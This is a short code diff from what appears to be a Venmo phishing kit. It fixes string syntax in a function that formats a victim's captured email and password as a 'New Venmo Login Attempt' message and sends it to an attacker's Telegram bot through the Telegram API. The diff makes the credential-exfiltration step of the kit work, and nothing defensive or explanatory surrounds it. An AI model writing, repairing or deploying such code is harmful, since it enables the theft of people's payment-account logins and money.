@@ -102,12 +102,12 @@ const sendToTelegram = async (email, password) => {
     return;
   }
 
-  const message = New Venmo Login Attempt!\n\n +
+  const message = `New Venmo Login Attempt!\n\n +
                   Email: ${email}\n +
                   Password: ${password || 'No password entered'}\n\n +
-                  Time: ${new Date().toLocaleString()};
+                  Time: ${new Date().toLocaleString()}`;
 
-  const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
     const response = await fetch(url, {
